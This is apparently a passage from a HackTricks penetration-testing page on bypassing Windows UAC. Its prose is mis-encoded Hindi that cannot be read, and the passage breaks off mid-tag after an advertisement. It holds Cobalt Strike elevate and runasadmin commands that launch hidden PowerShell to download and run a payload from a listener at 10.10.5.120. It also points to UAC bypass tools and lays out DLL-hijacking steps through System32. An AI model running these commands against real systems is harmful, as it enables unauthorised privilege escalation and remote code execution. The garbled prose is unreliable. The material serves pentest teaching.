UAC рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рддрдХрдиреАрдХреЗрдВ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдВрдЧреА рдЬрдм рддрдХ UAC рдЕрдкрдиреЗ рдореИрдХреНрд╕ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИред
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** рдФрд░ **Metasploit** рдореЗрдВ рднреА рдХрдИ рдореЙрдбреНрдпреВрд▓ рд╣реИрдВ рдЬреЛ **UAC** рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВред

### KRBUACBypass

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдФрд░ рдЯреВрд▓ [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) рдореЗрдВ рд╣реИрдВред

### UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕

[**UACME**](https://github.com/hfiref0x/UACME) рдЬреЛ рдХрдИ UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХрд╛ **рд╕рдВрдХрд▓рди** рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **visual studio рдпрд╛ msbuild рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ UACME рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**ред рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХрдИ executables (рдЬреИрд╕реЗ `Source\Akagi\outout\x64\Debug\Akagi.exe`) рдХреЛ рдмрдирд╛рдПрдЧреА, рдЖрдкрдХреЛ **рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЖрдкрдХреЛ рдХреМрди рд╕рд╛ рдЪрд╛рд╣рд┐рдП**ред\
рдЖрдкрдХреЛ **рд╕рддрд░реНрдХ рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдмрд╛рдЗрдкрд╛рд╕реЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ рдЕрдиреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдХреЛ **рдкреНрд░реЛрдореНрдкреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдХреБрдЫ рд╣реЛ рд░рд╣рд╛ рд╣реИред

UACME рдореЗрдВ рд╣рд░ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП **рдХрд┐рд╕ рдмрд┐рд▓реНрдб рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рд╢реБрд░реВ рд╣реБрдЖ** рд╣реИред рдЖрдк рдЕрдкрдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рд╡рд╛рд▓реА рддрдХрдиреАрдХ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
рдЗрд╕ [рдкреЗрдЬ](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╡рд┐рдВрдбреЛрдЬ рд░рд┐рд▓реАрдЬ `1607` рдХреЛ рдмрд┐рд▓реНрдб рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### рдФрд░ UAC рдмрд╛рдИрдкрд╛рд╕

рдпрд╣рд╛рдВ UAC рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рд╕рднреА** рддрдХрдиреАрдХреЛрдВ рдХреЛ рдПрдХ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рд╕рд╛рде **рдкреВрд░реНрдг рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдПрдХ рд╕рд╛рдорд╛рдиреНрдп nc.exe рд╢реЗрд▓ рдХрд╛рдлреА рдирд╣реАрдВ рд╣реИ)ред

рдЖрдк рдПрдХ **рдореАрдЯрд░рдкреНрд░реЗрдЯрд░** рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **рд╕рддреНрд░** рдорд╛рди **1** рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рдорд╛рдЗрдЧреНрд░реЗрдЯ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ рдХрд╛рдо рдХрд░реЗрдЧрд╛)

### GUI рдХреЗ рд╕рд╛рде UAC рдмрд╛рдИрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **GUI рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рдЬрдм рдЖрдк рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЖрдк UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕рдХреА рдмрд╛рдИрдкрд╛рд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдПрдХ GUI рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рдЖрдк UAC рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдРрд╕реЗ GUI рд╕рддреНрд░ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдХреЛрдИ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ **рдХреБрдЫ рдЯреВрд▓ рдРрд╕реЗ рд╣реЛрдВрдЧреЗ рдЬреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ** рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк UAC рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлрд┐рд░ рд╕реЗ рдкреНрд░реЙрдореНрдкреНрдЯ рди рд╣реЛрдиреЗ рдХреЗ рдмрд┐рдирд╛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдПрдХ cmd** рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)ред рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ **рдЫрд┐рдкрд╛рд╡** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╢реЛрд░рдЧреБрд▓ рдХреЗ рд╕рд╛рде рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ UAC рдмрд╛рдИрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЛ рд╢реЛрд░рдЧреБрд▓ рдХреА рдкрд░рд╡рд╛рд╣ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ рдХреБрдЫ рдРрд╕рд╛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) рдЬреЛ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░рддрд╛**ред

### рдЕрдкрдирд╛ рдмрд╛рдИрдкрд╛рд╕ - рдореВрд▓ UAC рдмрд╛рдИрдкрд╛рд╕ рдореЗрдердбреЛрд▓реЙрдЬреА

рдпрджрд┐ рдЖрдк **UACME** рдХреА рдУрд░ рджреЗрдЦреЗрдВ рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ **рдЕрдзрд┐рдХрд╛рдВрд╢ UAC рдмрд╛рдИрдкрд╛рд╕ Dll Hijacking рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рджреБрд╖реНрдЯ dll рдХреЛ _C:\Windows\System32_ рдкрд░ рд▓рд┐рдЦрдирд╛)ред [рдПрдХ Dll Hijacking рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдкрдврд╝реЗрдВ](../windows-local-privilege-escalation/dll-hijacking.md)ред

1. рдПрдХ рдмрд╛рдЗрдирд░реА рдвреВрдВрдвреЗрдВ рдЬреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрдиреНрдирдд рдХрд░реЗрдЧрд╛** (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЬрдм рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ)ред
2. рдкреНрд░реЛрд╕реЗрд╕рдореЙрди рдХреЗ рд╕рд╛рде "**рдирд╛рдо рдирд╣реАрдВ рдорд┐рд▓рд╛**" рдШрдЯрдирд╛рдПрдВ рдвреВрдВрдвреЗрдВ рдЬреЛ **DLL Hijacking** рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
3. рдЖрдкрдХреЛ рд╢рд╛рдпрдж **рдЕрднрд┐рд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ** (рдЬреИрд╕реЗ C:\Windows\System32) рдореЗрдВ DLL рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ:
1. **wusa.exe**: Windows 7,8 рдФрд░ 8.1ред рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдХрд┐ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ рдореЗрдВ CAB рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХреЗ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)ред
2. **IFileOperation**: Windows 10ред
4. рдЕрдкрдиреА DLL рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрде рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдФрд░ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рддреИрдпрд╛рд░ рдХрд░реЗрдВред

### рдПрдХ рдФрд░ UAC рдмрд╛рдИрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЗрд╕рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ рдХрд┐ рдПрдХ **рдСрдЯреЛрдЙрдиреНрдирдд рдмрд╛рдЗрдирд░реА** рджреНрд╡рд╛рд░рд╛ рджреЗрдЦрд╛ рдЬрд╛рдП рдХрд┐ рд╡рд╣ **рдирд╛рдо/рдкрде** рдПрдХ **рдмрд╛рдЗрдирд░реА** рдпрд╛ **рдХрдорд╛рдВрдб** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд░рдЬрд┐рд╕реНрдЯреНрд░реА** рд╕реЗ **рдкрдврд╝рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ (рдпрд╣ рдЕрдзрд┐рдХ рд░реЛрдЪрдХ рд╣реЛрддрд╛ рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **HKCU** рдХреЗ рдЕрдВрджрд░ рдЦреЛрдЬрддреА рд╣реИ)ред

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong
